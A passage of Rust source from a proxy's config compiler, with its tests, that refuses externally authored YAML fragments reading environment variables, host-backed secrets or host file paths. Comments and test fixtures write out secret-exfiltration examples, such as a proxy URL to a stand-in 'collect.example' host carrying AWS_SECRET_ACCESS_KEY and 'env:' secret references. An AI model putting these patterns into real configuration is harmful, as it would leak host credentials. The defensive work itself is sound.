    /// shapes that reach off the document: a secret reference the
    /// process resolver reads straight off this host, and an absolute or
    /// `~`-relative filesystem path, which is refused wherever it
    /// appears rather than only on a `HOST_FILE_KEYS` key, because that
    /// list is a list and a path assembled this way can land on a key it
    /// has never heard of.
    #[error(
        "externally authored config `{fragment}` writes a `${{VAR:-default}}` at `{path}` \
         whose default is {form}. A default is text this document wrote, not a value this \
         node supplies: the pre-parse pass makes it the value whenever the variable is \
         unset, so it is a literal in placeholder clothing and is refused as one. Write the \
         literal if the document owns this value, write `${{VAR}}` with no default and export \
         it on the node if the node owns it, or move the key into the layer this node owns. \
         See the `Confined fragments` section of docs/configuration.md."
    )]
    HostReachingDefault {
        /// Caller-supplied label for the document, for the operator.
        fragment: String,
        /// Dotted path to the offending field, suffixed with
        /// `(mapping key)` when the placeholder sits in a mapping key.
        path: String,
        /// What shape the default has, as static text. Never the
        /// default's own bytes: those are what a refusal must not echo.
        form: &'static str,
    },
    /// The document carries a secret reference of any kind, on a path
    /// where the document itself is the party that authored the value.
    ///
    /// Only [`ConfinementPolicy::bundle_manifest`] withholds this, and
    /// only a bundle manifest's own text gets that policy. Everywhere
    /// else a provider URI is allowed, because it resolves against a
    /// backend the operator declared.
    #[error(
        "externally authored config `{fragment}` sets `{path}` to a secret reference. The \
         value is one this document authored for itself, not one the operator wrote, so \
         nothing here resolves a secret on this host: a bundle that could point its own \
         config var at a secret could read it, and guest code reads its config. Set \
         `{path}` in the root config if this node should supply a secret for it. See the \
         `Confined fragments` section of docs/configuration.md."
    )]
    SecretReference {
        /// Caller-supplied label for the document, for the operator.
        fragment: String,
        /// The offending key. Never the value, and never the backend or
        /// name the reference points at.
        path: String,
    },
}

/// Resolve an externally authored config fragment against a binding
/// set, and nothing else.
///
/// `fragment` is a label for error messages: whatever identifies the
/// fragment to the operator (a repository and path, an `origin_sources`
/// entry). `yaml` is the fragment as fetched. `bindings` is the input
/// set the caller declared for it; a dotted reference
/// (`{{vars.limits.rps}}`) indexes the map with its first segment and
/// walks nested JSON objects with the rest, the same way origin
/// `variables:` resolve.
///
/// Shorthand for [`ConfinementPolicy::with_inputs`] over the same walk
/// [`check_confined_document`] runs, keeping the resolved text instead
/// of discarding it.
///
/// Returns the resolved fragment as YAML, ready to compose. The result
/// carries no live `${VAR}`, no resolvable `{{env.X}}`, no resolvable
/// `{{vars.X}}`, no host-backed secret reference, and no host file path,
/// so composing it into a document and handing that document to
/// [`crate::compile_config`] cannot reach the process environment or the
/// host filesystem through anything the fragment wrote.
///
/// The returned YAML is re-serialized from the parsed value tree, so
/// comments and formatting from the fragment do not survive. That is
/// deliberate as well as incidental: a comment is text nobody parses,
/// and the text-level `${VAR}` pass on the composed document would
/// happily substitute inside one.
///
/// # Errors
///
/// Returns a [`ConfinedTemplateError`] naming the fragment, the field
/// path, and the variable or form, for a fragment that does not parse,
/// carries a YAML tag, references the process environment in any form,
/// carries a host-backed secret reference, inlines a host file by path,
/// or references an input outside `bindings`.
pub fn resolve_confined_fragment(
    fragment: &str,
    yaml: &str,
    bindings: &HashMap<String, serde_json::Value>,
) -> Result<String, ConfinedTemplateError> {
    let policy = ConfinementPolicy::with_inputs(bindings.clone());
    let resolved = confine(fragment, yaml, &policy)?;
    // Serializing a parsed value tree cannot fail on any value that came
    // out of the parser, but the signature is fallible; report it the
    // same way a parse failure is reported rather than unwrapping.
    serde_yaml::to_string(&resolved).map_err(|source| ConfinedTemplateError::Parse {
        fragment: fragment.to_string(),
        source,
    })
}

/// Check a whole externally authored document against `policy` without
/// rewriting a byte of it.
///
/// This is the entry point for a document that is already complete: one
/// fetched from a git repository through a `source:` block, one a config
/// authority is about to publish, and one a subscriber has merged over
/// its local base. Those documents are signed, digested, or diffed by
/// their callers, so returning modified text would be wrong; the walk
/// runs over a throwaway parse and only the refusal escapes.
///
/// # Errors
///
/// Returns a [`ConfinedTemplateError`] naming the document, the field
/// path, and the offending form.
pub fn check_confined_document(
    label: &str,
    yaml: &str,
    policy: &ConfinementPolicy,
) -> Result<(), ConfinedTemplateError> {
    confine(label, yaml, policy).map(|_| ())
}

/// The one confined walk. Both entry points above are this function plus
/// a decision about what to do with its result.
///
/// Under a policy that grants the process environment the walk runs
/// **twice**: once over the document as authored, and once over the
/// document with its own `${VAR:-default}` defaults filled in. The
/// second pass is the reason [`fill_document_written_defaults`] exists,
/// and without it the whole boundary was one substitution behind the
/// enforcer. `compile_config` runs `interpolate_env_vars` over the raw
/// text before anything parses it
/// (`crate::compiler::compile_config`), so `"${SB_NOPE:-path}"` in
/// mapping-key position becomes the key `path` and
/// `"${SB_NOPE:-env:AWS_SECRET_ACCESS_KEY}"` in value position becomes a
/// host-backed secret reference, and a check that only ever saw the
/// pre-substitution text met neither (WOR-2433 re-review round 3).
fn confine(
    label: &str,
    yaml: &str,
    policy: &ConfinementPolicy,
) -> Result<serde_yaml::Value, ConfinedTemplateError> {
    let mut root: serde_yaml::Value =
        serde_yaml::from_str(yaml).map_err(|source| ConfinedTemplateError::Parse {
            fragment: label.to_string(),
            source,
        })?;
    let resolver = Resolver {
        fragment: label,
        policy,
        bound_names: policy.inputs.as_ref().map_or_else(String::new, bound_names),
    };
    resolver.walk(&mut root, "", Ancestry::default(), false)?;
    if policy.process_environment {
        let filled = fill_document_written_defaults(yaml);
        if filled != yaml {
            // The filled text is what the pre-parse pass hands the YAML
            // parser on a node where none of the named variables is set,
            // so a parse failure here is a parse failure the compile
            // would hit and is reported as one.
            let mut substituted: serde_yaml::Value =
                serde_yaml::from_str(&filled).map_err(|source| ConfinedTemplateError::Parse {
                    fragment: label.to_string(),
                    source,
                })?;
            resolver.walk(&mut substituted, "", Ancestry::default(), false)?;
        }
    }
    Ok(root)
}

/// The document with every `${VAR:-default}` replaced by the default it
/// wrote, and every bare `${VAR}` left exactly as authored.
///
/// This is the confinement *view* of the text, and the split is the
/// whole point. A bare `${VAR}` resolves to bytes the compiling node
/// supplies, which is the spelling
/// [`ConfinementPolicy::remote_document`] keeps on purpose and which
/// [`document_chose_the_path`] treats as the node's choice. A `:-`
/// default is bytes the *document* wrote, so it is checked as document
/// text, and it is filled in whether or not the variable happens to be
/// set on this host: a boundary that changed shape with the compiling
/// node's environment would refuse on one node and pass on the next.
///
/// The scan mirrors [`crate::compiler::interpolate_env_vars`] rather
/// than approximating it: the same `$$` pair-parity escape, the same
/// first-`}` terminator, the same `placeholder_is_env_reference`
/// allowlist, and the same byte-for-byte passthrough for an empty name
/// or an unterminated `${`. Anything it gets wrong here is a place the
/// detector is narrower than the enforcer.
fn fill_document_written_defaults(input: &str) -> String {
    let mut result = String::with_capacity(input.len());
    let mut chars = input.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch != '$' {
            result.push(ch);
            continue;
        }
        if chars.peek() == Some(&'$') {
            // The documented `$${VAR}` escape: consume the pair so the
            // `${` after it never opens a placeholder, and emit the
            // bytes untouched, exactly as the enforcer does.
            chars.next();
            result.push_str("$$");
            continue;
        }
        if chars.peek() != Some(&'{') {
            result.push(ch);
            continue;
        }
        chars.next();
        let mut var_name = String::new();
        let mut found_close = false;
        for c in chars.by_ref() {
            if c == '}' {
                found_close = true;
                break;
            }
            var_name.push(c);
        }
        let default = if found_close && !var_name.is_empty() {
            var_name
                .split_once(":-")
                .filter(|_| crate::compiler::placeholder_is_env_reference(&var_name))
                .map(|(_, default)| default)
        } else {
            None
        };
        match default {
            Some(default) => result.push_str(default),
            None => {
                result.push_str("${");
                result.push_str(&var_name);
                if found_close {
                    result.push('}');
                }
            }
        }
    }
    result
}

/// Check one already-parsed config value against `policy`, naming it by
/// the key the operator would edit.
///
/// The whole-document entry points above start from YAML text. A bundle
/// attachment's config vars are JSON that never was text, and the
/// enforcer for them resolves one named property at a time
/// (`sbproxy_extension::bundle::envelope::resolve_declared_secrets`), so
/// this is the same refusal set applied at the granularity that path
/// actually has. Nothing is substituted and nothing is returned: the
/// caller keeps the value it passed in, or gets the refusal.
///
/// # Errors
///
/// Returns a [`ConfinedTemplateError`] naming `label`, `key`, and the
/// offending form. Never the value.
pub fn check_confined_value(
    label: &str,
    key: &str,
    value: &str,
    policy: &ConfinementPolicy,
) -> Result<(), ConfinedTemplateError> {
    let resolver = Resolver {
        fragment: label,
        policy,
        bound_names: policy.inputs.as_ref().map_or_else(String::new, bound_names),
    };
    let shown = shown_path(key);
    resolver.refuse_env_references(&shown, value)?;
    resolver.refuse_host_reaching_default(&shown, value)?;
    resolver.refuse_host_secret_reference(&shown, value)?;
    resolver.refuse_secret_reference(&shown, value)
}

/// The bound input names, sorted, for an error message. Names only.
fn bound_names(bindings: &HashMap<String, serde_json::Value>) -> String {
    if bindings.is_empty() {
        return "(none)".to_string();
    }
    let mut names: Vec<&str> = bindings.keys().map(String::as_str).collect();
    names.sort_unstable();
    names.join(", ")
}

/// Carries the per-call context so the recursive walk does not thread
/// four arguments through every frame.
struct Resolver<'a> {
    fragment: &'a str,
    policy: &'a ConfinementPolicy,
    bound_names: String,
}

impl Resolver<'_> {
    /// Resolve and check every string in `value` in place.
    ///
    /// `in_script_body` is set once the walk has descended into a
    /// script-body key and stays set for that whole subtree, matching
    /// how `interpolate_config_vars` skips one.
    fn walk(
        &self,
        value: &mut serde_yaml::Value,
        path: &str,
        ancestry: Ancestry<'_>,
        in_script_body: bool,
    ) -> Result<(), ConfinedTemplateError> {
        match value {
            serde_yaml::Value::Tagged(tagged) => {
                return Err(ConfinedTemplateError::YamlTag {
                    fragment: self.fragment.to_string(),
                    path: shown_path(path),
                    tag: tagged.tag.to_string(),
                });
            }
            serde_yaml::Value::String(s) => {
                *s = self.resolve_string(path, s, in_script_body)?;
            }
            serde_yaml::Value::Sequence(seq) => {
                for (index, item) in seq.iter_mut().enumerate() {
                    let child = join_path(path, &index.to_string());
                    // The ancestry travels through a sequence: the
                    // owning key of `bulk_list: [ { path: ... } ]` is
                    // still `bulk_list` for the mapping inside it.
                    self.walk(item, &child, ancestry, in_script_body)?;
                }
            }
            serde_yaml::Value::Mapping(map) => {
                // Collect the keys first so the key subtree can be
                // walked with the same code that walks a value. A key is
                // config text too, and the pre-parse pass on the
                // composed document substitutes inside one:
                // `"${AWS_SECRET_ACCESS_KEY}": v` would exfiltrate
                // through a header name. Scanning only `key.as_str()`
                // left the YAML explicit-key form
                // (`? [ "${VAR}" ]` / `: {}`) unscanned, which is a
                // detector narrower than its enforcer at exactly the
                // spot this pass claims to have widened
                // (WOR-2433 review).
                let mut keys: Vec<serde_yaml::Value> = map.keys().cloned().collect();
                for key in &mut keys {
                    let key_name = key.as_str().map_or_else(|| "?".to_string(), str::to_owned);
                    let child = join_path(path, &key_name);
                    self.check_key(&child, key)?;
                }
                // The serde tag of this mapping, read once before the
                // mutable walk borrows it, for the entries whose key is
                // a host path under one variant and not under another
                // (`HostPathTest`). One hash lookup per mapping, and an
                // allocation only where a `type:` string is present.
                let sibling_type = map
                    .get(serde_yaml::Value::String("type".to_string()))
                    .and_then(serde_yaml::Value::as_str)
                    .map(str::to_owned);
                for (key, val) in map.iter_mut() {
                    let key_name = key.as_str().map_or_else(|| "?".to_string(), str::to_owned);
                    let child = join_path(path, &key_name);
                    if let Some(entry) = HOST_FILE_KEYS.iter().find(|entry| {
                        entry.refuses(ancestry, key_name.as_str(), val, sibling_type.as_deref())
                    }) {
                        if !self.policy.host_file_inlining {
                            return Err(ConfinedTemplateError::HostFileInlining {
                                fragment: self.fragment.to_string(),
                                path: shown_path(&child),
                                remedy: entry.remedy,
                            });
                        }
                    }
                    let script = in_script_body || SCRIPT_BODY_KEYS.contains(&key_name.as_str());
                    self.walk(val, &child, ancestry.under(key_name.as_str()), script)?;
                }
            }
            _ => {}
        }
        Ok(())
    }

    /// Check a mapping key, whatever shape it has.
    ///
    /// A key is never substituted: no later pass resolves `{{ }}` in key
    /// position, so rewriting one would be wider than the enforcer. It
    /// is scanned for everything a later pass *would* act on, and the
    /// scan recurses, so a sequence or a nested mapping in key position
    /// is covered rather than skipped.
    fn check_key(&self, path: &str, key: &serde_yaml::Value) -> Result<(), ConfinedTemplateError> {
        match key {
            serde_yaml::Value::Tagged(tagged) => Err(ConfinedTemplateError::YamlTag {
                fragment: self.fragment.to_string(),
                path: format!("{} (mapping key)", shown_path(path)),
                tag: tagged.tag.to_string(),
            }),
            serde_yaml::Value::String(text) => {
                let shown = format!("{} (mapping key)", shown_path(path));
                self.refuse_env_references(&shown, text)?;
                self.refuse_host_reaching_default(&shown, text)?;
                self.refuse_host_secret_reference(&shown, text)?;
                self.refuse_secret_reference(&shown, text)
            }
            serde_yaml::Value::Sequence(seq) => {
                for (index, item) in seq.iter().enumerate() {
                    self.check_key(&join_path(path, &index.to_string()), item)?;
                }
                Ok(())
            }
            serde_yaml::Value::Mapping(map) => {
                for (nested_key, nested_value) in map {
                    let name = nested_key
                        .as_str()
                        .map_or_else(|| "?".to_string(), str::to_owned);
                    let child = join_path(path, &name);
                    self.check_key(&child, nested_key)?;
                    self.check_key(&child, nested_value)?;
                }
                Ok(())
            }
            _ => Ok(()),
        }
    }

    /// Resolve one string: substitute the bound `{{vars.X}}` inputs when
    /// the policy binds any, then refuse anything the policy withholds
    /// that a later pass could still act on.
    fn resolve_string(
        &self,
        path: &str,
        input: &str,
        in_script_body: bool,
    ) -> Result<String, ConfinedTemplateError> {
        let shown = shown_path(path);
        // A script body is opaque: no `{{ }}` substitution, matching
        // `interpolate_config_vars`. Nothing resolves `{{ }}` there
        // later either, so a `{{env.X}}` in a Lua string is inert text
        // and stays as authored.
        let substitute = !in_script_body && self.policy.inputs.is_some();
        let resolved = if substitute {
            self.substitute_inputs(&shown, input)?
        } else {
            input.to_string()
        };
        // Post-substitution, not pre: a binding whose value contains
        // `$` or `{` can synthesize a live placeholder that was not in
        // the fragment as authored. A pre-substitution scan would never
        // see it.
        self.refuse_env_references(&shown, &resolved)?;
        self.refuse_host_reaching_default(&shown, &resolved)?;
        if substitute {
            self.refuse_resolvable_braces(&shown, &resolved)?;
        }
        self.refuse_host_secret_reference(&shown, &resolved)?;
        self.refuse_secret_reference(&shown, &resolved)?;
        Ok(resolved)
    }

    /// Replace `{{vars.X}}` / `{{variables.X}}` with the bound input.
    ///
    /// `{{env.X}}` is refused here rather than left for the residue scan
    /// so the error can say which form was written. Every other prefix
    /// is left literal, exactly as the fleet-wide pass leaves it.
    fn substitute_inputs(
        &self,
        shown_path: &str,
        input: &str,
    ) -> Result<String, ConfinedTemplateError> {
        let bindings = match self.policy.inputs.as_ref() {
            Some(bindings) => bindings,
            None => return Ok(input.to_string()),
        };
        let mut result = String::with_capacity(input.len());
        let mut rest = input;
        while let Some(start) = rest.find("{{") {
            result.push_str(&rest[..start]);
            let after_open = &rest[start + 2..];
            let Some(end) = after_open.find("}}") else {
                result.push_str(&rest[start..]);
                return Ok(result);
            };
            let key = after_open[..end].trim();
            if let Some(name) = key
                .strip_prefix("vars.")
                .or_else(|| key.strip_prefix("variables."))
            {
                match lookup_variable_path(bindings, name) {
                    Some(serde_json::Value::String(s)) => result.push_str(s),
                    Some(other) => result.push_str(&other.to_string()),
                    None => {
                        return Err(ConfinedTemplateError::UnboundInput {
                            fragment: self.fragment.to_string(),
                            path: shown_path.to_string(),
                            variable: name.to_string(),
                            bound: self.bound_names.clone(),
                        })
                    }
                }
            } else if let Some(name) = key.strip_prefix("env.") {
                if self.policy.process_environment {
                    result.push_str("{{");
                    result.push_str(&after_open[..end]);
                    result.push_str("}}");
                } else {
                    return Err(ConfinedTemplateError::EnvTemplate {
                        fragment: self.fragment.to_string(),
                        path: shown_path.to_string(),
                        variable: name.to_string(),
                    });
                }
            } else {
                result.push_str("{{");
                result.push_str(&after_open[..end]);
                result.push_str("}}");
            }
            rest = &after_open[end + 2..];
        }
        result.push_str(rest);
        Ok(result)
    }

    /// Refuse every live `${VAR}` in `text`, unless the policy grants
    /// the process environment.
    ///
    /// "Live" is decided by `env_references_in`, the same scanner the
    /// fleet-wide hazard report runs, so this refuses exactly the
    /// placeholders `interpolate_env_vars` would resolve from the
    /// environment: no more (`${args.id}`, `$${VAR}`, `${method}` and
    /// the documented access-log vocabulary stay literal) and no less.
    fn refuse_env_references(
        &self,
        shown_path: &str,
        text: &str,
    ) -> Result<(), ConfinedTemplateError> {
        if self.policy.process_environment {
            return Ok(());
        }
        if let Some(reference) = env_references_in(text).first() {
            // `${NAME}` / `${NAME:-default}` -> `NAME`. The default is
            // dropped from the message: the variable is what the author
            // has to stop naming.
            let inner = &reference[2..reference.len() - 1];
            let name = inner.split_once(":-").map_or(inner, |(name, _)| name);
            return Err(ConfinedTemplateError::EnvReference {
                fragment: self.fragment.to_string(),
                path: shown_path.to_string(),
                variable: name.to_string(),
                variable_escaped: format!("${reference}"),
            });
        }
        Ok(())
    }

    /// Refuse a `${VAR:-default}` whose default reaches off the
    /// document and onto this host.
    ///
    /// Only runs where `${VAR}` survives at all. Under
    /// [`ConfinementPolicy::sealed`] every placeholder is refused a
    /// moment earlier by [`Self::refuse_env_references`], with a message
    /// about the variable rather than about the default.
    ///
    /// Two shapes, and the reason each is fail-closed rather than left
    /// to the substituted-document pass in [`confine`]:
    ///
    /// * a **secret reference** the process resolver reads straight off
    ///   this host (`env:`, `vault://env/`, `file:`). The substituted
    ///   pass catches this one too; catching it here as well is what
    ///   gives the operator a message about the default they wrote
    ///   instead of about a value they cannot find in their document.
    /// * an **absolute or `~`-relative path**. This one the substituted
    ///   pass cannot catch, because `HOST_FILE_KEYS` is a list of keys
    ///   and an assembled path can land on a key nobody added to it. A
    ///   URL path (`/v1/search`) is caught by the same rule, which is
    ///   over-refusal on purpose and has two legal spellings that cost
    ///   nothing: write the literal, or write `${VAR}` with no default.
    fn refuse_host_reaching_default(
        &self,
        shown_path: &str,
        text: &str,
    ) -> Result<(), ConfinedTemplateError> {
        if !self.policy.process_environment {
            return Ok(());
        }
        for reference in env_references_in(text) {
            let inner = &reference[2..reference.len() - 1];
            let Some((_, default)) = inner.split_once(":-") else {
                continue;
            };
            let form = if host_backed_secret_reference(default).is_some() {
                "a secret reference this node's resolver reads off the host filesystem or \
                 process environment"
            } else if default.starts_with('/') || default == "~" || default.starts_with("~/") {
                "an absolute or `~`-relative path on this host"
            } else {
                continue;
            };
            return Err(ConfinedTemplateError::HostReachingDefault {
                fragment: self.fragment.to_string(),
                path: shown_path.to_string(),
                form,
            });
        }
        Ok(())
    }

    /// Refuse a secret reference the process resolver reads straight off
    /// the host, unless the policy grants that.
    ///
    /// This is the half of the boundary the template scan cannot see:
    /// `env:AWS_SECRET_ACCESS_KEY` carries no `${` and no `{{`, passes
    /// every template check untouched, and is read out of the process
    /// environment by `sbproxy-vault`'s resolver at config load. The
    /// module's own worked attack, `url:
    /// "https://collect.example/${AWS_SECRET_ACCESS_KEY}"`, was refused
    /// while the same attack spelled `api_key: "env:AWS_SECRET_ACCESS_KEY"`
    /// was not (WOR-2433 review).
    ///
    /// Unlike the `{{ }}` substitution, this runs inside a script body
    /// too, which is one place it is wider than the resolver: nothing
    /// resolves a secret reference out of a Lua or Rego body. The width
    /// costs nothing in practice, because the resolver matches a whole
    /// value and a script body would have to *begin* with `env:`,
    /// `file:` or `vault://env/` to trip it, and narrowing it would
    /// mean this walk had to carry the list of fields on which a secret
    /// reference is resolved, which is a list that drifts.
    fn refuse_host_secret_reference(
        &self,
        shown_path: &str,
        text: &str,
    ) -> Result<(), ConfinedTemplateError> {
        if self.policy.host_backed_secrets {
            return Ok(());
        }
        if let Some(source) = host_backed_secret_reference(text) {
            // `source.form()` and `source.reads()` are static strings;
            // neither the referenced name nor anything resolved from it
            // is read here, let alone rendered.
            let _: HostSecretSource = source;
            return Err(ConfinedTemplateError::HostSecretReference {
                fragment: self.fragment.to_string(),
                path: shown_path.to_string(),
                form: source.form(),
                reads: source.reads(),
            });
        }
        Ok(())
    }

    /// Refuse a secret reference of any kind, unless the policy grants
    /// the operator's declared backends.
    ///
    /// Only [`ConfinementPolicy::bundle_manifest`] withholds them, and
    /// this asks `crate::types::is_secret_reference` rather than repeating
    /// its prefix list, so the refusal is exactly as wide as the
    /// resolution it prevents: the bundle path resolves a config var
    /// when and only when that same predicate says yes. The
    /// host-backed forms are refused before this by
    /// [`Self::refuse_host_secret_reference`], which has the more
    /// specific message.
    fn refuse_secret_reference(
        &self,
        shown_path: &str,
        text: &str,
    ) -> Result<(), ConfinedTemplateError> {
        if self.policy.declared_secret_backends {
            return Ok(());
        }
        if crate::types::is_secret_reference(text) {
            return Err(ConfinedTemplateError::SecretReference {
                fragment: self.fragment.to_string(),
                path: shown_path.to_string(),
            });
        }
        Ok(())
    }

    /// Refuse every `{{ }}` placeholder a later pass would resolve.
    ///
    /// After [`Self::substitute_inputs`] has run, the only way one of
    /// these survives is that a binding's value synthesized it, so this
    /// is the fail-closed half of the injection check above.
    fn refuse_resolvable_braces(
        &self,
        shown_path: &str,
        text: &str,
    ) -> Result<(), ConfinedTemplateError> {
        let mut rest = text;
        while let Some(start) = rest.find("{{") {
            let after_open = &rest[start + 2..];
            let Some(end) = after_open.find("}}") else {
                return Ok(());
            };
            let key = after_open[..end].trim();
            if let Some(prefix) = RESOLVABLE_BRACE_PREFIXES
                .iter()
                .find(|prefix| key.starts_with(**prefix))
            {
                let name = &key[prefix.len()..];
                return Err(if *prefix == "env." {
                    ConfinedTemplateError::EnvTemplate {
                        fragment: self.fragment.to_string(),
                        path: shown_path.to_string(),
                        variable: name.to_string(),
                    }
                } else {
                    ConfinedTemplateError::UnboundInput {
                        fragment: self.fragment.to_string(),
                        path: shown_path.to_string(),
                        variable: name.to_string(),
                        bound: self.bound_names.clone(),
                    }
                });
            }
            rest = &after_open[end + 2..];
        }
        Ok(())
    }
}

/// `parent` and `child` joined with a dot, matching the dotted paths
/// `scan_yaml_hazards` reports.
fn join_path(parent: &str, child: &str) -> String {
    if parent.is_empty() {
        child.to_string()
    } else {
        format!("{parent}.{child}")
    }
}

/// The document root has no dotted path; name it so an error is not
/// missing its location.
fn shown_path(path: &str) -> String {
    if path.is_empty() {
        "<root>".to_string()
    } else {
        path.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::compiler::{interpolate_env_vars, unresolved_env_references};
    use crate::test_env::EnvVarGuard;

    /// The variable every leak test sets in the test process. If the
    /// confined pass ever reads the environment, this value shows up in
    /// an output or an error and the assertion naming it fails.
    const SECRET_VAR: &str = "SBPROXY_CONFINED_TEST_SECRET";
    /// The value that must never appear anywhere the confined pass
    /// produces.
    const SECRET_VALUE: &str = "sentinel-value-must-not-leak";

    fn secret_env() -> EnvVarGuard {
        EnvVarGuard::set(&[("SBPROXY_CONFINED_TEST_SECRET", Some(SECRET_VALUE))])
    }

    fn bindings(pairs: &[(&str, serde_json::Value)]) -> HashMap<String, serde_json::Value> {
        pairs
            .iter()
            .map(|(k, v)| ((*k).to_string(), v.clone()))
            .collect()
    }

    #[test]
    fn fragment_env_reference_is_refused_without_reading_the_variable() {
        let _env = secret_env();
        let fragment = format!(
            "action:\n  type: proxy\n  url: \"https://collect.example/${{{SECRET_VAR}}}\"\n"
        );
        let error = resolve_confined_fragment("acme/api@sb.yml", &fragment, &bindings(&[]))
            .expect_err("a fragment naming a process variable must be refused");
        match &error {
            ConfinedTemplateError::EnvReference {
                fragment,
                path,
                variable,
                ..
            } => {
                assert_eq!(variable, SECRET_VAR);
                assert_eq!(path, "action.url");
                assert_eq!(fragment, "acme/api@sb.yml");
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        let rendered = error.to_string();
        assert!(rendered.contains(SECRET_VAR), "{rendered}");
        assert!(
            !rendered.contains(SECRET_VALUE),
            "the refusal echoed the variable's value: {rendered}"
        );
    }

    #[test]
    fn fragment_env_reference_with_a_shell_default_is_refused_by_variable_name() {
        let _env = secret_env();
        let fragment = format!("action:\n  url: \"x/${{{SECRET_VAR}:-fallback}}\"\n");
        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
            .expect_err("a `:-default` form is still an environment read");
        match &error {
            ConfinedTemplateError::EnvReference { variable, .. } => {
                // The variable, not the default: the name is what the
                // fragment author has to stop writing.
                assert_eq!(variable, SECRET_VAR);
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn lua_script_env_reference_is_refused_without_reading_the_variable() {
        let _env = secret_env();
        // The pre-parse text pass reaches a script body, which is the
        // whole reason the post-parse interpolator's skip list is not
        // enough on its own.
        let fragment = format!(
            "transforms:\n  - type: lua\n    lua_script: |\n      local leak = \"${{{SECRET_VAR}}}\"\n      return leak\n"
        );
        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
            .expect_err("a script body naming a process variable must be refused");
        match &error {
            ConfinedTemplateError::EnvReference { variable, path, .. } => {
                assert_eq!(variable, SECRET_VAR);
                assert_eq!(path, "transforms.0.lua_script");
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        assert!(
            !error.to_string().contains(SECRET_VALUE),
            "the refusal echoed the variable's value"
        );
    }

    #[test]
    fn script_bodies_pass_every_other_placeholder_through_verbatim() {
        let _env = secret_env();
        // A script body is opaque: no `{{ }}` substitution even for a
        // bound input, and the documented `$$` escape plus the MCP
        // runtime vocabulary survive byte for byte.
        let body = "local a = \"$${HOME}\"\nlocal b = \"${args.user_id}\"\nlocal c = \"{{vars.rps}}\"\nlocal d = \"{{env.HOME}}\"\nlocal e = {{ 1, 2 }}";
        let fragment = serde_yaml::to_string(&serde_json::json!({
            "transforms": [{ "type": "lua", "lua_script": body }]
        }))
        .expect("fixture serializes");
        let out = resolve_confined_fragment(
            "acme/api",
            &fragment,
            &bindings(&[("rps", serde_json::json!(50))]),
        )
        .expect("a script body with no environment reference resolves");
        let parsed: serde_yaml::Value = serde_yaml::from_str(&out).expect("output parses");
        let round_tripped = parsed["transforms"][0]["lua_script"]
            .as_str()
            .expect("the script body survives as a string");
        assert_eq!(round_tripped, body);
        assert!(!out.contains(SECRET_VALUE));
    }

    #[test]
    fn env_template_form_is_refused_without_reading_the_variable() {
        let _env = secret_env();
        let fragment = format!(
            "request_modifiers:\n  - headers:\n      set:\n        X-Leak: \"{{{{env.{SECRET_VAR}}}}}\"\n"
        );
        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
            .expect_err("`{{env.X}}` is an environment read too");
        match &error {
            ConfinedTemplateError::EnvTemplate { variable, path, .. } => {
                assert_eq!(variable, SECRET_VAR);
                assert_eq!(path, "request_modifiers.0.headers.set.X-Leak");
            }
            other => panic!("expected an EnvTemplate refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn a_mapping_key_naming_a_variable_is_refused() {
        let _env = secret_env();
        // The pre-parse pass substitutes inside a KEY as readily as
        // inside a value, so scanning values alone would be a detector
        // narrower than its enforcer.
        let fragment = format!("headers:\n  \"${{{SECRET_VAR}}}\": \"anything\"\n");
        let error = resolve_confined_fragment("acme/api", &fragment, &bindings(&[]))
            .expect_err("a mapping key naming a process variable must be refused");
        match &error {
            ConfinedTemplateError::EnvReference { variable, path, .. } => {
                assert_eq!(variable, SECRET_VAR);
                assert!(path.ends_with("(mapping key)"), "{path}");
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn a_bound_input_resolves_including_a_dotted_path() {
        let fragment = "policies:\n  - type: rate_limiting\n    requests_per_second: \"{{vars.limits.rps}}\"\n    burst: \"{{variables.burst}}\"\n";
        let out = resolve_confined_fragment(
            "acme/api",
            fragment,
            &bindings(&[
                ("limits", serde_json::json!({ "rps": 25 })),
                ("burst", serde_json::json!("50")),
            ]),
        )
        .expect("bound inputs resolve");
        let parsed: serde_yaml::Value = serde_yaml::from_str(&out).expect("output parses");
        assert_eq!(parsed["policies"][0]["requests_per_second"], "25");
        assert_eq!(parsed["policies"][0]["burst"], "50");
    }

    #[test]
    fn an_unbound_input_is_a_named_error_listing_only_input_names() {
        let fragment = "action:\n  url: \"https://{{vars.upstream}}/v1\"\n";
        let error = resolve_confined_fragment(
            "acme/api",
            fragment,
            &bindings(&[("token", serde_json::json!("s3cr3t-binding-value"))]),
        )
        .expect_err("an input outside the binding set is an error, not a passthrough");
        match &error {
            ConfinedTemplateError::UnboundInput {
                variable,
                path,
                bound,
                ..
            } => {
                assert_eq!(variable, "upstream");
                assert_eq!(path, "action.url");
                assert_eq!(bound, "token");
            }
            other => panic!("expected an UnboundInput refusal, got {other:?}"),
        }
        assert!(
            !error.to_string().contains("s3cr3t-binding-value"),
            "the refusal listed a binding's value, not just its name"
        );
    }

    #[test]
    fn a_binding_value_cannot_synthesize_an_environment_reference() {
        let _env = secret_env();
        // Scanning the fragment before substitution would miss this:
        // the live `${...}` exists only in the substituted result.
        let fragment = "action:\n  url: \"https://collect.example/{{vars.suffix}}\"\n";
        let error = resolve_confined_fragment(
            "acme/api",
            fragment,
            &bindings(&[("suffix", serde_json::json!(format!("${{{SECRET_VAR}}}")))]),
        )
        .expect_err("a synthesized environment reference must be refused");
        match &error {
            ConfinedTemplateError::EnvReference { variable, .. } => {
                assert_eq!(variable, SECRET_VAR);
            }
            other => panic!("expected an EnvReference refusal, got {other:?}"),
        }
        assert!(!error.to_string().contains(SECRET_VALUE));
    }

    #[test]
    fn a_binding_value_cannot_synthesize_a_resolvable_template() {
        let _env = secret_env();
        let fragment = "action:\n  url: \"https://collect.example/{{vars.suffix}}\"\n";
        let error = resolve_confined_fragment(
            "acme/api",
            fragment,
            &bindings(&[(
                "suffix",
                serde_json::json!(format!("{{{{env.{SECRET_VAR}}}}}")),
            )]),
        )
